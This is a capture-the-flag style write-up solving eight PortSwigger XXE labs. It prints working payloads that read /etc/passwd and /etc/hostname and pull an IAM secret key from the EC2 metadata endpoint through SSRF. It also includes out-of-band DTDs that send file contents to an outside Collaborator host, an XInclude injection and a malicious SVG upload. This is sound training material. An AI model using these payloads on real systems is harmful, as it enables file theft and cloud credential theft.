# XML External Entity (XXE) injection

## Lab 1: Exploiting XXE using external entities to retrieve files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file

### Sol :

* Click `check stock` button and intercept the request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/cb985550-dc41-473f-bd2f-39d16da37bc2)

* Give the below payload between the XML declaration and `stockcheck` element.

      <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

* Replace the `productID` with `&xxe;`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/5f826b3e-8fdc-4d27-8692-a3656cde0dba)

* Forward the request. We will get the `passwd` file
* Thus, the lab is solved.

## Lab 2: Exploiting XXE to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

### Sol :

* Click `check stock` button and intercept the request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d3bb9191-7155-4b48-8e75-6714d1ea5ecd)

* Give the below payload between the XML declaration and `stockcheck` element.

      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>

* Replace the `productID` with `&xxe;`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/cb1bcdbc-db7b-452b-beb8-3ae06eac84e8)

* Forward the request. We will obtain the server's IAM secret access key from the EC2 metadata endpoint.
* Thus, the lab is solved.

## Lab 3: Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator

### Sol :

* Click `check stock` button and intercept the request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/77c4c68d-69c0-4628-88f8-37d08cb2278c)

* Give the below payload between the XML declaration and `stockcheck` element and your own Burp Collaborator payload.

      <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://8enq6m2m8qzud1x82itu68s9a0gr4hs6.oastify.com"> ]>

* Replace the `productID` with `&xxe;`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/717b869f-17ec-4577-9cf1-d32b92ebb7b3)

* Forward the request, we will get that lab is solved.

## Lab 4: Blind XXE with out-of-band interaction via XML parameter entities

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

### Sol :

* Click `check stock` button and intercept the request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/77c4c68d-69c0-4628-88f8-37d08cb2278c)

* Give the below payload between the XML declaration and `stockcheck` element and your own Burp Collaborator payload.

      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://yuw9ydysol5e9y6vowhoq7umpdv4jv7k.oastify.com"> %xxe; ]>

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/16265929-1738-412d-808f-30dc54ea3f41)

* Forward the request, we will get that lab is solved.

## Lab 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file.

### Sol :

* Click `check stock`, Intercept the request and send it to the repeater.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/1fdc3ff1-6307-4364-ab33-b019b34f3597)

* Go to `Exploit Server` and create a `dtd` payload of below:

      <!ENTITY % file SYSTEM "file:///etc/hostname">
      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
      %eval;
      %exfil;

* Replace the `BURP-COLLABORATOR-SUBDOMAIN` with your own collaborator payload.
* Save this payload with .dtd extension
* Store the payload and click `View exploit` and take a note of URL.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/574bc151-ecfc-4e52-9ad9-ead0564cf9c3)

* Give below payload as external entity definition in between the XML declaration and the `stockCheck` element by giving your own DTD URL.

      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/608286ee-387a-4062-840a-9f69b9754dde)

* Go to `Burp Collaborator` and see the `HTTP` request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/338bcfe1-c2d9-4e4b-ba2c-6209faea1a56)

* Enter the `x` code to solve the lab. Thus, the lab is solved.

## Lab 6: Exploiting blind XXE to retrieve data via error messages

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

### Sol :

* Click `check stock`, Intercept the request and send it to the repeater.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/1fdc3ff1-6307-4364-ab33-b019b34f3597)

* Give the below payload as external entity definition in between the XML declaration and the stockCheck element by giving your own DTD URL.

        <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/884e11b1-b0fa-4180-a40d-9676e111d0da)

* Go to exploit server and give the below payload and save it as `dtd` file.

        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
        %eval;
        %exfil;
  
* Click `store` and `View exploit`. Note the URL and give it to the external tag.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d0839d65-60d6-436c-aa60-711ccab79fdd)

* We got the `passwd` file and lab is solved.

## Lab 7: Exploiting XInclude to retrieve files

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.

### Sol :

* Click `check stock` and intercept the request.
* Change the `productId` to the below payload

      <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/67e19c3b-6fcf-4a7b-96d4-e231842ee97d)

* We got the `passwd` file and lab is solved.

## Lab 8: Exploiting XXE via image file upload

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

### Sol :

* Create a local SVG image with the following content:

      <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

* Save it with .svg and upload it as avatar in the comment box.
